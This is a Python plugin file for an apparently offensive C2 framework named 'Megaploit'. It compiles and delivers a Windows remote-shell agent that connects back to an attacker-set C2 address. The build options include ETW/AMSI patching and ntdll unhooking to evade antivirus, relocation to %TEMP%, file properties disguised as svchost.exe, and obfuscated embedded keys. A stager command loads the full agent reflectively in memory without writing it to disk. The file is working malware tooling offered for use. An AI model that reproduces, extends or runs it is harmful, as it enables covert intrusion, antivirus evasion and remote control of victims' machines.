"""
plugins.c_remote_shell
~~~~~~~~~~~~~~~~~~~~~~
Python handlers for the C-remote-shell Megaploit plugin.

Commands provided
-----------------
  crs_build         — compile the Windows C agent (MinGW or MSVC)
  crs_probe         — run megaploit.core.c_probe compliance check
  crs_verbs         — list all C-exclusive verbs detected in the source
  crs_payload_info  — print the build flags needed for a given LHOST/PORT
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys

from megaploit.plugins.schema import PluginContext


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_SUBMODULE_DIR = "C-remote-shell"


def _c_remote_shell_dir() -> str:
    """Absolute path to the C-remote-shell submodule directory."""
    return os.path.abspath(_SUBMODULE_DIR)


def _find_mingw() -> str | None:
    """Return the first MinGW / MSYS2 gcc found, or None.

    Checks cross-compiler names on PATH first (Linux/macOS build hosts),
    then absolute MSYS2 UCRT64 / MINGW64 locations common on Windows.
    """
    # Cross-compiler names available on Linux/macOS
    candidates = [
        "x86_64-w64-mingw32-gcc",
        "i686-w64-mingw32-gcc",
    ]
    for name in candidates:
        if shutil.which(name):
            return name

    # Native Windows: MSYS2 gcc not always on system PATH — check well-known dirs
    abs_candidates = [
        r"C:\msys64\ucrt64\bin\gcc.exe",
        r"C:\msys64\mingw64\bin\gcc.exe",
        r"C:\msys64\mingw32\bin\gcc.exe",
        r"C:\msys2\ucrt64\bin\gcc.exe",
        r"C:\msys2\mingw64\bin\gcc.exe",
    ]
    for path in abs_candidates:
        if os.path.isfile(path):
            return path

    return None


def _find_msys2_bash() -> str | None:
    """Return the MSYS2 bash.exe path when running on Windows, or None."""
    candidates = [
        r"C:\msys64\usr\bin\bash.exe",
        r"C:\msys2\usr\bin\bash.exe",
    ]
    for path in candidates:
        if os.path.isfile(path):
            return path
    return None


def _find_msvc() -> bool:
    """Return True if cl.exe (MSVC) is available on PATH."""
    return shutil.which("cl") is not None


# ---------------------------------------------------------------------------
# crs_build — compile the Windows agent
# ---------------------------------------------------------------------------

def crs_build(args: list[str], ctx: PluginContext) -> str:
    """
    Compile the C-remote-shell Windows agent EXE.

    Usage: crs_build [--no-migrate] [--no-evasion] [lhost] [port]

    --no-migrate   Compile with -DDISABLE_AUTO_MIGRATE (no %TEMP% relocation).
                   Use this when testing the agent directly on the attacker box.
    --no-evasion   Compile with -DDISABLE_EVASION (skip ETW/AMSI patch and
                   ntdll unhook). Prevents AV triggers during development.

    lhost/port are optional; the current session LHOST/PORT are used if omitted.
    Falls back to config.h defaults if nothing is set.

    A fresh 32-byte key is generated, embedded in the binary, and written to
    secret.key in the server's working directory.  The key fingerprint is
    printed so both sides can be confirmed.

    Requires MinGW (x86_64-w64-mingw32-gcc) or MSVC (cl.exe) on PATH.
    """
    root = _c_remote_shell_dir()
    if not os.path.isdir(root):
        return f"[-] C-remote-shell directory not found at '{root}'"

    # Parse optional flags before positional arguments
    no_migrate   = False
    no_evasion   = False
    http_profile = False
    positional: list[str] = []
    for a in args:
        if a == "--no-migrate":
            no_migrate = True
        elif a == "--no-evasion":
            no_evasion = True
        elif a == "--http-profile":
            http_profile = True
        else:
            positional.append(a)

    lhost = positional[0] if len(positional) >= 1 else ctx.lhost
    port  = positional[1] if len(positional) >= 2 else str(ctx.port)

    lines: list[str] = []

    # Compiler detection
    mingw = _find_mingw()
    msvc  = _find_msvc()

    if not mingw and not msvc:
        return (
            "[-] No C compiler found.\n"
            "    Linux/macOS: apt install mingw-w64\n"
            "    Windows:     open a Developer Command Prompt for VS"
        )

    # ── Key generation + per-build config header ─────────────────────────
    # Passing C2_IP and SECRET_KEY_BYTES as -D flags via subprocess.run is
    # unreliable: Windows subprocess argument quoting strips the embedded
    # double-quotes that make C2_IP a string literal, and \xNN escapes in
    # SECRET_KEY_BYTES are stray tokens at the preprocessor command-line level.
    #
    # Solution: write a temporary "megaploit_build_config.h" file in the
    # build root and inject it via -include.  The header uses normal C source
    # syntax so all literals work correctly and no shell quoting is needed.
    _SECRET_KEY_MASK = bytes([
        0x5A, 0x3C, 0xF1, 0x07, 0x9B, 0xE4, 0x2D, 0x60,
        0xA8, 0x14, 0x77, 0xCC, 0x3E, 0x91, 0x55, 0xD2,
        0x0F, 0xB3, 0x6A, 0x48, 0xFE, 0x22, 0x89, 0x71,
        0xC5, 0x4B, 0x1D, 0xA0, 0x36, 0xE7, 0x8C, 0x59,
    ])
    raw_key = os.urandom(32)
    obf     = bytes(b ^ m for b, m in zip(raw_key, _SECRET_KEY_MASK))
    # Use 0xNN integer literals — works in #define macro bodies, -D flags,
    # and C source files (unlike \xNN which only works inside string/char literals)
    key_literal = "{" + ",".join(f"0x{b:02X}" for b in obf) + "}"

    # Write the per-build config header
    config_hdr = os.path.join(root, "megaploit_build_config.h")
    config_lines = [
        "/* Auto-generated by crs_build - do not commit */",
        "#pragma once",
    ]
    if lhost:
        config_lines.append(f'#ifndef C2_IP')
        config_lines.append(f'#define C2_IP "{lhost}"')
        config_lines.append(f'#endif')
    if port:
        config_lines.append(f'#ifndef C2_PORT')
        config_lines.append(f'#define C2_PORT {port}')
        config_lines.append(f'#endif')
    config_lines.append(f'#ifndef SECRET_KEY_BYTES')
    config_lines.append(f'#define SECRET_KEY_BYTES {key_literal}')
    config_lines.append(f'#endif')
    if no_migrate:
        config_lines.append('#ifndef DISABLE_AUTO_MIGRATE')
        config_lines.append('#define DISABLE_AUTO_MIGRATE')
        config_lines.append('#endif')
    if no_evasion:
        config_lines.append('#ifndef DISABLE_EVASION')
        config_lines.append('#define DISABLE_EVASION')
        config_lines.append('#endif')
    if http_profile:
        config_lines.append('#ifndef C2_HTTP_PROFILE')
        config_lines.append('#define C2_HTTP_PROFILE')
        config_lines.append('#endif')

    try:
        with open(config_hdr, "w", encoding="ascii") as f:
            f.write("\n".join(config_lines) + "\n")
    except OSError as e:
        return f"[-] Could not write build config header: {e}"

    key_file = os.path.join(os.getcwd(), "secret.key")
    hex_key  = raw_key.hex()   # 64-char hex string for secret.key
    try:
        with open(key_file, "wb") as f:
            f.write(hex_key.encode())
    except OSError as e:
        return f"[-] Could not write secret.key: {e}"

    from megaploit.core.crypto import key_fingerprint
    fp = key_fingerprint(raw_key)
    lines.append(f"[+] Key generated  fingerprint={fp}")
    lines.append(f"[+] secret.key written \u2192 {key_file}")

    # Full source list — must match CLIENT_SRCS in C-remote-shell/Makefile
    _client_srcs = [
        "client/core/main.c",
        "client/evasion/spoof.c",
        "client/evasion/peb_walk.c",
        "client/evasion/syscall.c",
        "client/evasion/evasion.c",
        "client/core/ntcalls.c",
        "client/shell/shell.c",
        "client/shell/handlers_system.c",
        "client/shell/handlers_ui.c",
        "client/shell/handlers_lateral.c",
        "client/inject/inject.c",
        "tls/tls_client.c",
    ]
    # Include pre-compiled VERSIONINFO resource if present (makes the EXE look
    # like svchost.exe in file properties; harmless to omit if windres failed)
    _res = os.path.join(root, "client", "inject", "agent.res")
    if os.path.isfile(_res):
        _client_srcs.append("client/inject/agent.res")

    if mingw:
        compiler = mingw
        lines.append(f"[*] Using MinGW: {compiler}")
        srcs = [os.path.join(root, s) for s in _client_srcs]
        out = os.path.join(os.getcwd(), "megaploit_c_agent.exe")
        # All per-build defines (C2_IP, SECRET_KEY_BYTES, disable flags) are in
        # the auto-generated config header — no -D flags needed for them.
        cflags = [
            "-Os", "-s", "-DNDEBUG", "-DUNICODE", "-D_UNICODE", "-DSECURITY_WIN32",
            "-ffunction-sections", "-fdata-sections",
            "-fno-ident", "-fno-asynchronous-unwind-tables",
            f"-I{os.path.join(root, 'client', 'core')}",
            f"-I{os.path.join(root, 'client', 'evasion')}",
            f"-I{os.path.join(root, 'client', 'inject')}",
            f"-I{os.path.join(root, 'client', 'shell')}",
            f"-I{os.path.join(root, 'tls')}",
            # -include and the header path must be separate list elements so
            # shlex.quote produces '-include' '/path/to/hdr.h' (with a space),
            # not '-include/path/to/hdr.h' (no-space form that MSYS2 gcc rejects)
            "-include", os.path.join(root, "megaploit_build_config.h"),
        ]
        libs = [
            "-Wl,--gc-sections", "-Wl,--strip-all",
            "-lsecur32", "-lcrypt32", "-lws2_32", "-lbcrypt",
            "-ladvapi32", "-luser32", "-lshell32", "-mwindows",
        ]
        cmd = [compiler] + cflags + srcs + ["-o", out] + libs

    else:
        compiler = "cl"
        lines.append(f"[*] Using MSVC: {compiler}")
        srcs = [os.path.join(root, s) for s in _client_srcs]
        out = os.path.join(os.getcwd(), "megaploit_c_agent.exe")
        # All per-build defines are in the auto-generated config header.
        cflags = [
            "/nologo", "/W3", "/O1", "/GS-", "/Gy", "/GL", "/DNDEBUG",
            f"/I{os.path.join(root, 'client', 'core')}",
            f"/I{os.path.join(root, 'client', 'evasion')}",
            f"/I{os.path.join(root, 'client', 'inject')}",
            f"/I{os.path.join(root, 'client', 'shell')}",
            f"/I{os.path.join(root, 'tls')}",
            f"/FI{os.path.join(root, 'megaploit_build_config.h')}",
        ]
        # No C2_IP / SECRET_KEY_BYTES / disable flags as /D args — all in header
        libs = [
            "Secur32.lib", "Crypt32.lib", "ws2_32.lib", "bcrypt.lib",
            "Advapi32.lib", "User32.lib", "Shell32.lib",
        ]
        cmd = [compiler] + cflags + srcs + ["/link", "/OPT:REF", "/OPT:ICF", "/LTCG"] + libs + [f"/out:{out}"]

    lines.append(f"[*] Output: {out}")
    lines.append(f"[*] Config header: {config_hdr}")
    if lhost:
        lines.append(f"[*] C2_IP={lhost}  C2_PORT={port}")
    if http_profile:
        lines.append(f"[*] Flag: C2_HTTP_PROFILE (HTTP/1.1 POST wrapper around C2 frames)")
    if no_migrate:
        lines.append("[*] Flag: DISABLE_AUTO_MIGRATE (no %TEMP% relocation)")
    if no_evasion:
        lines.append("[*] Flag: DISABLE_EVASION (ETW/AMSI/unhook skipped)")
    lines.append(f"[*] Running: {' '.join(cmd)}")

    # ── Run the compiler ─────────────────────────────────────────────────
    # MSYS2 gcc on Windows cannot write to Python-captured pipes (it uses
    # MSYS2's own PTY mechanism).  When we detect a MSYS2 gcc, we run the
    # build through MSYS2 bash so stderr is properly captured and reported.
    msys2_bash = _find_msys2_bash() if mingw and os.path.sep == "\\" else None

    if msys2_bash:
        # Convert Windows paths to MSYS2 unix paths for the shell command.
        # The config header path needs forward slashes; gcc handles both.
        def _to_unix(p: str) -> str:
            r"""Convert C:\foo\bar -> /c/foo/bar for MSYS2 bash."""
            if len(p) >= 2 and p[1] == ":":
                return "/" + p[0].lower() + p[2:].replace("\\", "/")
            return p.replace("\\", "/")

        # Build a single bash -c command string; quote each arg for POSIX shell.
        # Arguments that embed a Windows path (e.g. -I/path, -include /path,
        # source files, -o) must all be converted to MSYS2 /drive/... form.
        # For "-Ipath" style flags, strip the prefix, convert, then re-attach.
        import shlex as _shlex

        def _unix_arg(a: str) -> str:
            s = str(a)
            # Handle -IFOO, -LFOO prefixes where FOO is a Windows path
            for pfx in ("-I", "-L", "-include"):
                if s.startswith(pfx) and len(s) > len(pfx) and s[len(pfx)].isalpha() and (len(s) > len(pfx)+1 and s[len(pfx)+1] == ":"):
                    return pfx + _to_unix(s[len(pfx):])
            # Plain Windows paths (absolute or containing backslashes)
            if (len(s) >= 2 and s[1] == ":") or "\\" in s:
                return _to_unix(s)
            return s

        unix_cmd = " ".join(_shlex.quote(_unix_arg(a)) for a in cmd)
        # Add PATH using MSYS2 /drive/path form so bash can find gcc
        gcc_dir = _to_unix(os.path.dirname(mingw))
        bash_script = f'export PATH="{gcc_dir}:$PATH"; {unix_cmd}'

        # MSYS2 bash can't write to Python-captured pipes either.
        # Write the script to a temp .sh file and redirect output to a temp
        # file from within the script; then read that file back.
        import tempfile
        tmpdir   = tempfile.gettempdir()
        sh_file  = os.path.join(tmpdir, "megaploit_build.sh")
        out_file = os.path.join(tmpdir, "megaploit_build_out.txt")

        # The script appends "2>&1" so both stdout and stderr go to out_file
        script_body = (
            "#!/bin/bash\n"
            "set -e\n"
            f'{bash_script} > "{_to_unix(out_file)}" 2>&1\n'
        )
        with open(sh_file, "w", newline="\n", encoding="ascii") as f:
            f.write(script_body)

        lines.append("[*] Using MSYS2 bash for capture-safe invocation")
        try:
            proc = subprocess.run(
                [msys2_bash, _to_unix(sh_file)],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=300,
            )
        except FileNotFoundError as e:
            return "\n".join(lines) + f"\n[-] bash not found: {e}"
        except subprocess.TimeoutExpired:
            return "\n".join(lines) + "\n[-] Build timed out after 300s."

        err_out = ""
        if os.path.exists(out_file):
            with open(out_file, encoding="utf-8", errors="replace") as f:
                err_out = f.read().strip()
        if not err_out:
            err_out = (proc.stderr or proc.stdout or "").strip()

    else:
        # Non-MSYS2 compilers (cross-compiler on Linux, MSVC) — direct subprocess
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,
            )
        except FileNotFoundError as e:
            return "\n".join(lines) + f"\n[-] Compiler not found: {e}"
        except subprocess.TimeoutExpired:
            return "\n".join(lines) + "\n[-] Build timed out after 300s."

        err_out = (proc.stderr or proc.stdout or "").strip()

    # ── Report result ─────────────────────────────────────────────────────
    if proc.returncode != 0:
        if err_out:
            lines.append(f"[-] Build FAILED (exit {proc.returncode}):\n{err_out}")
        else:
            lines.append(
                f"[-] Build FAILED (exit {proc.returncode}) — "
                f"no compiler output captured.\n"
                f"    Config header preserved at: {config_hdr}\n"
                f"    Manual build: cd C-remote-shell && make "
                f"C2_IP={lhost or '0.0.0.0'} C2_PORT={port or 4444} "
                f"SECRET_KEY={hex_key}"
            )
    else:
        lines.append(f"[+] Build OK -> {out}")
        lines.append(f"[+] Key embedded in binary -- no secret.key needed on target.")
        lines.append(f"[*] Server secret.key fingerprint={fp}  (keep this file)")
        # Clean up the temp config header on success
        try:
            os.remove(config_hdr)
        except OSError:
            pass

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# crs_stage_serve — push the full agent PE to a stager session
# ---------------------------------------------------------------------------

def crs_stage_serve(args: list[str], ctx: PluginContext) -> str:
    """
    Push the full agent PE to a connected stager over an existing session.

    Usage:
        crs_stage_serve <session_id> <agent_exe_path>

    Protocol:
        1. Send the "stage_load" verb to the stager session.
        2. Wait for "STAGE_READY" reply.
        3. Read the full agent PE from disk.
        4. Send the raw PE bytes as a single TLS frame.
        5. Wait for "[+] stage_load: PE loaded..." confirmation.

    The stager never writes the PE to disk — it maps it in-memory via
    the reflective loader blob and starts AgentRun() in a new thread.
    """
    if len(args) < 2:
        return "Usage: crs_stage_serve <session_id> <agent_exe_path>"

    session_id  = args[0]
    agent_path  = args[1]

    if not os.path.isfile(agent_path):
        return f"[-] crs_stage_serve: file not found: {agent_path}"

    # Resolve the session
    try:
        sessions = ctx.sessions  # type: ignore[attr-defined]
        sess = sessions.get(session_id)
        if sess is None:
            return f"[-] crs_stage_serve: session '{session_id}' not found"
    except AttributeError:
        return "[-] crs_stage_serve: ctx.sessions not available"

    try:
        from megaploit.core.protocol import send_msg, recv_msg
        tls = sess.tls  # type: ignore[attr-defined]

        # Step 1: send stage_load verb
        send_msg(tls, b"stage_load")

        # Step 2: wait for STAGE_READY
        reply = recv_msg(tls)
        if reply != b"STAGE_READY":
            return f"[-] crs_stage_serve: unexpected reply: {reply!r}"

        # Step 3: read PE
        with open(agent_path, "rb") as f:
            pe_bytes = f.read()

        # Step 4: send raw PE as one frame
        send_msg(tls, pe_bytes)

        # Step 5: confirmation
        confirm = recv_msg(tls)
        return confirm.decode("utf-8", errors="replace")

    except Exception as e:
        return f"[-] crs_stage_serve: {e}"


# ---------------------------------------------------------------------------
# crs_probe — run the c_probe compliance report
# ---------------------------------------------------------------------------

def crs_probe(args: list[str], ctx: PluginContext) -> str:
    """
    Run the Megaploit C2 compliance probe against C-remote-shell source.

    Checks all four security layers:
      Layer 1 — SChannel TLS 1.2/1.3
      Layer 2 — HMAC-SHA256 auth
      Layer 3 — Protocol v2 negotiation
      Layer 4 — AES-256-GCM framing + replay protection
    """
    root = _c_remote_shell_dir()
    if not os.path.isdir(root):
        return f"[-] C-remote-shell directory not found at '{root}'"

    try:
        from megaploit.core.c_probe import probe, format_report
    except ImportError as e:
        return f"[-] Could not import c_probe: {e}"

    result = probe(root)
    return format_report(result)


# ---------------------------------------------------------------------------
# crs_verbs — list C-exclusive wire verbs
# ---------------------------------------------------------------------------

def crs_verbs(args: list[str], ctx: PluginContext) -> str:
    """
    List all wire-protocol verbs dispatched by the C agent.
    Marks which are C-exclusive (not handled by the Python agent).
    """
    root = _c_remote_shell_dir()
    if not os.path.isdir(root):
        return f"[-] C-remote-shell directory not found at '{root}'"

    try:
        from megaploit.core.c_probe import extract_verbs, c_exclusive_verbs
    except ImportError as e:
        return f"[-] Could not import c_probe: {e}"

    all_verbs  = extract_verbs(root)
    exclusive  = set(c_exclusive_verbs(root))

    lines = ["[*] C agent verb dispatch table:", ""]
    for verb in all_verbs:
        tag = "  [C-only]" if verb in exclusive else ""
        lines.append(f"    {verb!r}{tag}")

    lines.append("")
    lines.append(f"[*] {len(all_verbs)} total verbs  |  {len(exclusive)} C-exclusive")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# crs_payload_info — print what to bake into the EXE
# ---------------------------------------------------------------------------

def crs_payload_info(args: list[str], ctx: PluginContext) -> str:
    """
    Show the compile-time flags needed to point the C agent at this server.
    """
    lhost = ctx.lhost or "YOUR_LHOST"
    port  = ctx.port  or 50005

    srcs = (
        "  client/core/main.c  client/evasion/spoof.c  client/evasion/peb_walk.c\n"
        "  client/evasion/syscall.c  client/evasion/evasion.c  client/core/ntcalls.c\n"
        "  client/shell/shell.c  client/shell/handlers_system.c\n"
        "  client/shell/handlers_ui.c  client/shell/handlers_lateral.c\n"
        "  client/inject/inject.c  tls/tls_client.c"
    )

    return (
        "[*] C-remote-shell payload configuration\n"
        "\n"
        f"    C2_IP    = {lhost}\n"
        f"    C2_PORT  = {port}\n"
        "\n"
        "    Recommended — use crs_build (auto-generates and embeds a key):\n"
        f"      crs_build {lhost} {port}\n"
        "\n"
        "    For testing without AV/evasion triggers:\n"
        f"      crs_build --no-migrate --no-evasion {lhost} {port}\n"
        "\n"
        "    Manual MinGW build (key embedded via gen_key.py):\n"
        f"      python tools/gen_key.py --embed $(cat secret.key) > flag.txt\n"
        f"      x86_64-w64-mingw32-gcc -Os -s -DNDEBUG -DSECURITY_WIN32 \\\n"
        f"        -DC2_IP=\\\"{lhost}\\\" -DC2_PORT={port} $(cat flag.txt) \\\n"
        f"        -ffunction-sections -fdata-sections \\\n"
        f"        -I C-remote-shell/client -I C-remote-shell/tls \\\n"
        f"{srcs} \\\n"
        "        -o megaploit_c_agent.exe \\\n"
        "        -Wl,--gc-sections -Wl,--strip-all \\\n"
        "        -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -lshell32 -mwindows\n"
        "\n"
        "    Optional compile-time guards:\n"
        "      -DDISABLE_AUTO_MIGRATE  skip %TEMP% relocation (testing only)\n"
        "      -DDISABLE_EVASION       skip ETW/AMSI/unhook patches (testing only)\n"
        "\n"
        "    Key is embedded in the binary — no secret.key needed on the target."
    )
